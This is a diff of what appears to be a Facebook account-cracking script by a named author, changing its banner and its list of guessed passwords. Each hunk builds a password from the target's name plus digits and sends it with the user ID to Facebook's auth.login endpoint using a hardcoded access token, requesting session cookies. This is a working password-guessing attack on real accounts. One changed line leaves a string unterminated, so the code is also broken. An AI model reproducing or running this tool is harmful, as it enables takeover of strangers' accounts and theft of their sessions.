@@ -94,7 +94,7 @@ logo = """
 
 \033[1;96m◁━━━━━━━━━━━━━━━━━━━━◈✙◈━━━━━━━━━━━━━━━━━━━━▷\033[1;97m
 
-\033[1;96m(~)\033[1;97m Author : Wahid Baloch \033[1;97m[ \033[0;92mIHSANO KANJAR \033[1;97m]
+\033[1;96m(~)\033[1;97m Author : Wahid Baloch \033[1;97m[ \033[0;92mWAHID CRACKER \033[1;97m]
 
 \033[1;96m(~)\033[1;97m Github : https://github.com/Wahidbaloch88
 
@@ -568,7 +568,7 @@ def menu_select():
 
 		try:
 
-		    pass1="786786786"
+		    pass1=name+"123"
 
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -602,7 +602,7 @@ def menu_select():
 
 		        else:
 
-		            pass2="ludostar123"
+		            pass2=name+"1234"
 
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -670,7 +670,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4="janjan"
+		                            pass4=name+"12345"
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -704,7 +704,7 @@ def menu_select():
 
 		                                else:
 
-		                                    pass5="pak123"
+		                                    pass5="pak123
 
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -738,7 +738,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6="ludostar"
+		                                            pass6=name+"786"
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
